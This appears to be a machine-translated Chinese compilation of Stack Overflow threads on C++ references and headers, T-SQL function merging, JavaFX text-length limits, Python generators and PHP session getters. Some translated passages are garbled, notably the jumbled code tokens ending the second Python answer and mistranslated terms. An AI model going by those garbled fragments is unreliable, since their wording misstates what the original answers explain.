在您的第一个函数中，`a`是`x`in main 的别名，当它被复制`return a;`到函数的返回值中时[在 x86 中，这将是`eax`寄存器，对于我知道它们如何工作的所有编译器变体]。所以我们返回一个值的副本`x`。

在第二个示例中，`x`应用了相同的别名，但我们返回“别名”，实际上，可以读取代码：

```
 int y;
   max(x);
   y = x; 
```

就这段代码的目的而言，它确实没有什么区别，但如果你有这样的事情：

```
int &max(int &x, int &x)
{
    if (x > y) return x;
    return y;
}

int main()
{
   int a = 10;
   int b = 13;

   int& c = max(a, b);

   c = 12;

   cout << "a=" << a << " b=" << b << " c=" << c;
} 
```

现在我们应该看到`b`被赋予了 的值`12`，因为`c`它变成了 的别名`b`。**

# c++ - 为什么不同文件中的类在没有标题的情况下找不到彼此？

> ID：15159986
> 
> 赞同：0
> 
> 时间：2013-03-01T14:23:15.037
> 
> 标签：c++, visual-studio-2010, header-files

请看下面的代码

主文件

```
#include <iostream>

using namespace std;

int main()
{
    Class1 c;
} 
```

Class1.cpp

```
#include <iostream>

using namespace std;

class Class1
{
public:
    void click1()
    {
        cout << "Click 1" << endl;
    }
}; 
```

类2.cpp

```
#include <iostream>

using namespace std;

class Class2
{
public:
    void click2()
    {
        cout << "Click 2" << endl;
    }
}; 
```

如果我将头文件添加到上述类，它们就可以工作。为什么 C++ 不理解没有头文件的不同文件中的类？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-01T14:26:58.810

在 C++ 中，源文件称为*翻译单元*。每个翻译单元相互独立，基本不知道彼此的存在。您必须*明确告诉*编译器翻译单元应该知道什么。

这是通过*声明*事物来完成的。而不是在许多文件和位置中使用相同的声明，而是将它们放在所有源文件都包含的单个头文件中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T14:25:26.440

> 为什么 C++ 不理解没有头文件的不同文件中的类？

为什么要呢？没有约定要求文件名以某种方式命名，或者每个文件包含一个公共类。您可以自由地将整个类层次结构放在一个头文件中，只要它在逻辑上有意义。例如，表`<algorithms>`头不包含任何名为的内容`"algorithms"`，但名称非常直观。

最后，C++ 中并没有要求东西必须在类或类模板中。您可以拥有充满命名空间级 C 风格函数声明的文件。没有合理的命名约定来支持这种性质的文件。

该`#include`指令解决了这个问题，并让您可以灵活地以您想要的方式命名文件。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-01T14:25:51.717

> 为什么 C++ 不理解没有头文件的不同文件中的类？

这就是 C++（坏的）编译模型的工作原理。

编译器分别处理每个翻译单元（**文件**`.cpp`）；然后，由各个编译单元处理产生的所有对象文件由链接器合并以创建程序的可执行文件。

 ***在处理一个翻译单元时，编译器不会看到在处理其他*翻译单元时已经解析过的实体。

> 如果我将头文件添加到上述类，它们就可以工作

这是因为`#include`ing 相应的标题使这些实体的声明（或定义）对需要使用它们的每个翻译单元可见。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-01T14:26:23.863

头文件的目的主要是声明项目。在 C++ 中，任何类、变量等都必须始终有一个声明。如果您不提供这些，编译器将找不到相应的类、变量等。

见[SO](https://stackoverflow.com/questions/1410563/what-is-the-difference-between-a-definition-and-a-declaration)。**

# sql-server-2008 - 标量函数-合并

> ID：15159987
> 
> 赞同：0
> 
> 时间：2013-03-01T14:23:15.910
> 
> 标签：sql-server-2008, tsql

我有一个标量函数，它被写了 3 次，并做了一个小的改动。我打算将这三个功能合并为一个功能。

```
ForStudent- A
Declare @CN INT
SELECT @cn=COUNT(*)
FROM XYZ A
WHERE A.subjects in ('1223','2234','3345')

IF @cnt>3       
SELECT @Pass=1      
ELSE       
SELECT @Pass=0 

RETURN @Pass
END

//Similarly ForStudent - B
     Declare @CN INT
        SELECT @cn=COUNT(*)
        FROM XYZ A
        WHERE A.subjects in ('1214','0987','0098')

        IF @cnt>5      
        SELECT @Pass=1      
        ELSE       
        SELECT @Pass=0 

        RETURN @Pass
        END 
```

学生 3 也一样。

例如，只有 3 个学生（固定值 = 3），并且他们有固定的科目。如何将这三个功能合二为一？

```
I am presently doing with
IF @Student= 'A'
BEGIN
Call the code for A
END
IF @Student = 'B'
BEGIN
Call the code for B
END
IF @Student = 'C'
Call the code for C
END 
```

有没有人能想到的更好的解决方案？谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T14:35:15.777

最明显的方法是有一个`StudentSubjects`表格（可能有一些迹象表明它是用于此功能的，或者使用现有的此类表格，其中可以以某种方式标记 3 个特殊主题）

```
CREATE TABLE StudentSubjects (
    StudentID char(1) not null,
    Subject char(4) not null
) 
```

（每个学生有 3 行，每个科目单独存储）

然后你的功能就是：

```
SELECT @cn=COUNT(*)
FROM XYZ A
WHERE A.subjects in (select Subject from StudentSubjects where StudentID=@StudentID) 
```

# java - JavaFX 2.2 文本字段最大长度

> ID：15159988
> 
> 赞同：15
> 
> 时间：2013-03-01T14:23:16.613
> 
> 标签：java, javafx, javafx-2, textfield, maxlength

我正在处理 JavaFX 2.2 项目，但在使用`TextField`控件时遇到问题。我想限制用户可以输入每个`TextField`. 但是我找不到属性或类似*maxlength*的东西。*Swing*中也存在同样的问题，就[这样](https://stackoverflow.com/questions/3519151/how-to-limit-the-number-of-characters-in-jtextfield)解决了。如何为 JavaFX 2.2 解决它？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2014-02-24T03:36:37.773

这是在通用文本字段上完成这项工作的更好方法：

```
public static void addTextLimiter(final TextField tf, final int maxLength) {
    tf.textProperty().addListener(new ChangeListener<String>() {
        @Override
        public void changed(final ObservableValue<? extends String> ov, final String oldValue, final String newValue) {
            if (tf.getText().length() > maxLength) {
                String s = tf.getText().substring(0, maxLength);
                tf.setText(s);
            }
        }
    });
} 
```

工作完美，除了那个撤消错误。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2015-10-19T15:39:17.503

使用 java8u40，我们得到了一个新类 TextFormatter：它的主要职责之一是在文本输入的任何更改被提交到内容*之前提供一个挂钩。*在那个钩子中，我们可以[接受/拒绝](https://stackoverflow.com/a/33217981/203657)甚至更改提议的更改。

[OP的自我回答](https://stackoverflow.com/a/15188135/203657)中解决的要求是

*   规则：将文本长度限制为短于 n 个字符
*   修改：如果违反规则，保留最后n个字符作为输入文本，并在其开头删除多余的字符

使用 TextFormatter，这可以像这样实现：

```
// here we adjust the new text 
TextField adjust = new TextField("scrolling: " + len);
UnaryOperator<Change> modifyChange = c -> {
    if (c.isContentChange()) {
        int newLength = c.getControlNewText().length();
        if (newLength > len) {
            // replace the input text with the last len chars
            String tail = c.getControlNewText().substring(newLength - len, newLength);
            c.setText(tail);
            // replace the range to complete text
            // valid coordinates for range is in terms of old text
            int oldLength = c.getControlText().length();
            c.setRange(0, oldLength);
        }
    }
    return c;
};
adjust.setTextFormatter(new TextFormatter(modifyChange)); 
```

旁白：

*   在监听其更改的同时修改属性可能会导致意外的副作用
*   所有关于关键级别事件的建议解决方案都已损坏（它们无法处理粘贴/编程更改

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2013-03-01T14:38:23.750

您可以执行类似于此处描述的方法的操作：http: [//fxexperience.com/2012/02/restricting-input-on-a-textfield/](http://fxexperience.com/2012/02/restricting-input-on-a-textfield/)

```
class LimitedTextField extends TextField {

    private final int limit;

    public LimitedTextField(int limit) {
        this.limit = limit;
    }

    @Override
    public void replaceText(int start, int end, String text) {
        super.replaceText(start, end, text);
        verify();
    }

    @Override
    public void replaceSelection(String text) {
        super.replaceSelection(text);
        verify();
    }

    private void verify() {
        if (getText().length() > limit) {
            setText(getText().substring(0, limit));
        }

    }
}; 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2013-03-03T17:01:37.557

我用来解决我的问题的完整代码是下面的代码。我像 Sergey Grinev 一样扩展了 TextField 类，并添加了一个空的构造函数。为了设置最大长度，我添加了一个 setter 方法。我首先检查然后替换 TextField 中的文本，因为我想禁用插入超过 maxlength 个字符，否则将在 TextField 的末尾插入 maxlength + 1 个字符，并且 TextField 的第一个字符将被删除。

```
package fx.mycontrols;

public class TextFieldLimited extends TextField {  
    private int maxlength;
    public TextFieldLimited() {
        this.maxlength = 10;
    }
    public void setMaxlength(int maxlength) {
        this.maxlength = maxlength;
    }
    @Override
    public void replaceText(int start, int end, String text) {
        // Delete or backspace user input.
        if (text.equals("")) {
            super.replaceText(start, end, text);
        } else if (getText().length() < maxlength) {
            super.replaceText(start, end, text);
        }
    }

    @Override
    public void replaceSelection(String text) {
        // Delete or backspace user input.
        if (text.equals("")) {
            super.replaceSelection(text);
        } else if (getText().length() < maxlength) {
            // Add characters, but don't exceed maxlength.
            if (text.length() > maxlength - getText().length()) {
                text = text.substring(0, maxlength- getText().length());
            }
            super.replaceSelection(text);
        }
    }
} 
```

**在 fxml 文件**中，我在文件顶部添加了导入（TextFieldLimited 类存在的包），并将 TextField 标记替换为自定义 TextFieldLimited。

```
<?import fx.mycontrols.*?>
.  
.  
. 
<TextFieldLimited fx:id="usernameTxtField" promptText="username" /> 
```

**在控制器类内部**，

在顶部（财产声明），
`@FXML`
`private TextFieldLimited usernameTxtField;`

在初始化方法中，
`usernameTxtField.setLimit(40);`

就这样。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-08-28T19:39:54.833

我正在使用一种更简单的方法来限制字符数并强制输入数字：

```
public TextField data;
public static final int maxLength = 5;

data.textProperty().addListener(new ChangeListener<String>() {
    @Override
    public void changed(ObservableValue<? extends String> observable,
            String oldValue, String newValue) {
        try {
            // force numeric value by resetting to old value if exception is thrown
            Integer.parseInt(newValue);
            // force correct length by resetting to old value if longer than maxLength
            if(newValue.length() > maxLength)
                data.setText(oldValue);
        } catch (Exception e) {
            data.setText(oldValue);
        }
    }
}); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2014-10-26T14:58:08.267

下面的代码将重新定位光标，这样用户就不会意外覆盖他们的输入。

```
public static void setTextLimit(TextField textField, int length) {
    textField.setOnKeyTyped(event -> {
        String string = textField.getText();

        if (string.length() > length) {
            textField.setText(string.substring(0, length));
            textField.positionCaret(string.length());
        }
    });
} 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2014-10-31T10:58:04.887

此方法让 TextField 完成所有处理（复制/粘贴/撤消安全）。不需要进行扩展类。并允许您决定每次更改后如何处理新文本（将其推送到逻辑，或返回到先前的值，甚至修改它）。

```
 // fired by every text property change
textField.textProperty().addListener(
  (observable, oldValue, newValue) -> {
    // Your validation rules, anything you like
      // (! note 1 !) make sure that empty string (newValue.equals("")) 
      //   or initial text is always valid
      //   to prevent inifinity cycle
    // do whatever you want with newValue

    // If newValue is not valid for your rules
    ((StringProperty)observable).setValue(oldValue);
      // (! note 2 !) do not bind textProperty (textProperty().bind(someProperty))
      //   to anything in your code.  TextProperty implementation
      //   of StringProperty in TextFieldControl
      //   will throw RuntimeException in this case on setValue(string) call.
      //   Or catch and handle this exception.

    // If you want to change something in text
      // When it is valid for you with some changes that can be automated.
      // For example change it to upper case
    ((StringProperty)observable).setValue(newValue.toUpperCase());
  }
); 
```

对于您的情况，只需在其中添加此逻辑即可。完美运行。

```
 // For example 10 characters     
  if (newValue.length() >= 10) ((StringProperty)observable).setValue(oldValue); 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2017-05-08T01:47:28.523

我有这段代码只允许数字并限制Javafx中文本字段的输入长度。

```
// Event handler for inputPrice
     inputPrice.setOnAction(event2 -> {

            // Obtain input as a String from text field
            String inputPriceStr = inputPrice.getText();

            // Get length of the String to compare with max length
            int length = inputPrice.getText().length();

            final int MAX = 10; // limit number of characters

            // Validate user input allowing only numbers and limit input size
            if (inputPriceStr.matches("[0-9]*") && length < MAX ) {

                 // your code here
             }}); 
```

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2020-02-11T09:14:27.733

```
private void registerListener1(TextField tf1, TextField tf2,TextField tf3,TextField tf4) {
    tf1.textProperty().addListener((obs, oldText, newText) -> {

        if(newText.length() == 12) {

            tf1.setText(newText.substring(0, 3));
            tf2.setText(newText.substring(tf1.getText().length(), 6));              
            tf3.setText(newText.substring(tf1.getText().length()+tf2.getText().length(), 9));
            tf4.setText(newText.substring(tf1.getText().length()+tf2.getText().length()+tf3.getText().length()));
            tf4.requestFocus();
        }
    });

}

private void registerListener(TextField tf1, TextField tf2) {
    tf1.textProperty().addListener((obs, oldText, newText) -> {
        if(oldText.length() < 3 && newText.length() >= 3) {
            tf2.requestFocus();
        }
    });

} 
```

# python - 循环内的副作用会影响其生成器吗？

> ID：15159997
> 
> 赞同：1
> 
> 时间：2013-03-01T14:23:57.163
> 
> 标签：python, for-loop, python-2.7, generator, side-effects

在 Python v2.7 中，我遇到了一个关于生成器的`for`语句，`for`其中在循环体中，作为`for`生成器源的项目受到了副作用：

```
for ssid in (ssid for ssid in overlaps if ssid != subseq_id):
  overlaps = subseq_id_to_overlap_ssids_dict[ssid] 
```

我的问题是重叠的副作用是否应该影响`for`发电机？我希望不是，但如果是这样，那到底是什么意思？如果我已经处理了第一个匹配元素并且现在被替换`overlaps`，那么`for`索引是否会指向新值的下一个位置`overlaps`？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T14:26:27.933

在循环内重新绑定`overlaps`不会对循环产生任何影响（尽管改变它显然会）。在循环侧重新绑定 subseq_iq 可能会影响生成器。

循环计算表达式以在`for`循环开始时获得一个迭代器：在这种情况下，表达式只是 name `overlaps`。一旦它评估了该表达式，它就会从可迭代对象中创建一个迭代器，并使用该迭代器来处理元素。迭代器取决于表达式返回的对象，它不依赖于用于标识该对象的名称（如果确实有任何名称）。

如果这种特殊情况，代码完全等同于：

```
for ssid in overlaps:
  if ssid != subseq_id:
     overlaps = subseq_id_to_overlap_ssids_dict[ssid] 
```

这是一种更清晰的编写方式，但再次绑定`overlaps`不会更改`for`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-01T14:31:51.433

`for`循环通过迭代它的参数来操作，即调用它`iter`的参数来产生一个迭代器，然后调用`next`迭代器直到`StopIteration`被引发。

您的生成器理解参数在进入循环`overlaps`之前评估名称表达式，因此重新绑定名称将无效；改变引用的对象会产生一些影响，这取决于迭代器的过度操作方式。例如，迭代器在列表中增加一个索引。`for``overlaps``overlaps``type(overlaps)``list`

# session-variables - PHP 会话类返回值

> ID：15159998
> 
> 赞同：1
> 
> 时间：2013-03-01T14:23:58.577
> 
> 标签：session-variables, php

我有一个简单的会话类（下）：

```
class Session{

    public static function init(){
            @session_start();
        }

    public static function set($key, $value){
            $_SESSION[$key] = $value;
    }

    public static function get($key){
      if (isset($_SESSION[$key])) {
        return $_SESSION[$key];
       } else if(empty($key)){
        return $_SESSION;
       }

    }

    public static function destroy(){
        session_destroy();
    }

 } 
```

要设置单个会话值，我使用

```
 Session::set(Name, value); 
```

要设置多个会话值，我使用

```
 Session::set(Name, array(name, value....)); 
```

然后简单地检索我需要我使用的会话：

```
 Session::get(Name); 
```

现在我的问题是，当我可以设置多维值时，我实际上无法使用上面的当前 get 函数获取它们。那么我如何重新构建我的 get($key) 以便它不仅返回单个请求而且返回任何请求

```
 Session::set('joe', 'bloggs');
  Session::set('beth', array('age'=>'21','height'=>'5.5ft')); 
```

因此，例如，我再次得到一个会话值 EG Joe：

```
 Session::get('joe'); 
```

然后，如果我想获取 beth 的详细信息，我可以将会话值分配给 var，然后访问内部详细信息，如下所示：

```
 $age = Session::get('beth');
   $age['age'] 
```

但是有可能重建我的get方法，所以我可以这样做：

```
 Session::get('beth','age'); 
```

还是最好坚持我目前正在做的事情。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T14:32:08.513

您可以将您的`get`方法更新为：

```
public static function get($key, $item = NULL){
    if (isset($_SESSION[$key])) {
        if(isset($item) && isset($_SESSION[$key][$item])) {
            return $_SESSION[$key][$item];
        }

        return $_SESSION[$key];
    } 

    return NULL; //not found
} 
```

然后你可以像这样使用它：

```
Session::get('joe'); // returns array
Session::get('joe', 'age'); // returns joe's age 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T14:39:10.047

**这是你需要的**

```
Session::set('joe', 'bloggs');
Session::set('beth', array('age' => '21','height' => '5.5ft','ball' => array("A" => "blue","B" => "Green")));

var_dump(Session::get("beth", "age")); // returns 21
var_dump(Session::get("beth", "ball", "A")); // returns blue 
```

**您的课程已修改**

```
class Session {

    private static function init() {
        if (session_status() != PHP_SESSION_ACTIVE)
            session_start();
    }

    public static function set($key, $value) {
        self::init();
        $_SESSION[$key] = $value;
    }

    public static function get() {
        self::init();
        $args = func_get_args(); // Get all arguments
        $items = $_SESSION; // create a tempoary version of $_SESSION aarray
        foreach ( $args as $ndx ) {
            // Take Item and override with Subitem
            $items = isset($items[$ndx]) ? $items[$ndx] : null;
        }
        return $items;
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T14:32:23.033

当心。这可能会让我们中的一些人感到困惑，因为在某些框架中，getter 中的第二个参数表示*默认值*：

```
Session::get('key', 'defaultValue'); 
```

`defaultValue`如果 key 不存在，将返回。

可能不是最好的解决方案，但是您可以将所有内容转换`set`为一个特殊的类（可能被称为`KeyValue`或其他），并且当您使用 get 时，您可以返回键的值**或**另一个`KeyValue`对象，执行`get()`相同的操作再次返回值**OR** another `KeyValue`。这样，您将能够以一种相当酷的方式对链进行方法：

```
Session::get('beth')->get('age') 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T14:43:03.740

这样的功能可以与无限数量的键一起使用：

```
public static function get()
{
    $array = $_SESSION;
    $keys = func_get_args();
    foreach($keys as $key)
    {
        if(isset($array[$key]))
            $array = $array[$key];
        else
            return FALSE; // or it could return array()
    }

    return $array;
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-11-24T06:48:34.553

在 Core PHP 或其他任何 PHP 框架中，用于显示 SESSION 中的所有数据

```
 print_r($_SESSION);
   public function setSessionValue($session_name, $session_value){
         $_SESSION[$session_name] = $session_value;
   }

   public function getSessionValue($session_name){
         return $_SESSION[$session_name];
   } 
```